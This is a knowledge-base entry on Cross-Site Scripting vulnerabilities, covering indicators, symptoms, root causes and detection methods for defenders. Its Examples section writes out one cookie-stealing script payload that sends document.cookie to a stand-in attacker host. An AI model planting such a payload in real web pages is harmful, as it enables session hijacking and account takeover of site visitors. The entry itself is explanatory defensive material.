---
title: Cross-Site Scripting Vulnerabilities
description: Inadequate input validation and output encoding allows attackers to inject
  malicious scripts that execute in users' browsers.
category:
- Code
- Security
related_problems:
- slug: sql-injection-vulnerabilities
  similarity: 0.65
- slug: log-injection-vulnerabilities
  similarity: 0.6
- slug: buffer-overflow-vulnerabilities
  similarity: 0.55
- slug: session-management-issues
  similarity: 0.55
- slug: authentication-bypass-vulnerabilities
  similarity: 0.5
layout: problem
---

## Description

Cross-Site Scripting (XSS) vulnerabilities occur when web applications fail to properly validate user input or encode output, allowing attackers to inject malicious scripts that execute in other users' browsers. These vulnerabilities can lead to session hijacking, data theft, defacement, or other malicious activities performed in the context of the victim's browser session.

## Indicators ⟡

- User input displayed in web pages without proper encoding
- JavaScript code can be injected through form fields or URL parameters
- Dynamic content generation without input sanitization
- Client-side data validation without corresponding server-side validation
- User-generated content displayed without security filtering

## Symptoms ▲

- **Script Injection:** Malicious JavaScript code executed in user browsers
- **Session Token Theft:** Attackers stealing session cookies through injected scripts
- **Page Defacement:** Unauthorized modification of web page content
- **Phishing Attacks:** Fake login forms or content injected to steal credentials
- **Malicious Redirects:** Users redirected to attacker-controlled websites

## Root Causes ▼

- **Insufficient Input Validation:** User input not properly validated or sanitized before processing
- **Missing Output Encoding:** Dynamic content not encoded appropriately for the output context
- **Direct DOM Manipulation:** Client-side code directly inserting user data into the DOM
- **Inadequate Content Security Policy:** Missing or weak CSP headers allowing script execution
- **Server-Side Template Injection:** Template engines processing user input without proper escaping
- **Third-Party Component Vulnerabilities:** Vulnerable JavaScript libraries or frameworks

## Detection Methods ○

- **Input Validation Testing:** Test all input fields and parameters for script injection
- **Output Encoding Analysis:** Review how user data is displayed and encoded in responses
- **Automated Security Scanning:** Use security scanners to identify potential XSS vulnerabilities
- **Code Review for XSS Patterns:** Review code for common XSS vulnerability patterns
- **Content Security Policy Testing:** Verify CSP effectiveness in preventing script injection

## Examples

A blog application displays user comments directly in HTML without encoding special characters. An attacker posts a comment containing `<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>` which executes in every visitor's browser, sending their session cookies to the attacker's server. The attacker can then use these session cookies to impersonate users and access their accounts. Another example involves a search function that displays the search term in the results page like "Results for: [user input]". An attacker crafts a malicious URL with JavaScript in the search parameter. When victims click the link, the script executes and can perform actions on behalf of the user, such as changing account settings or making unauthorized transactions.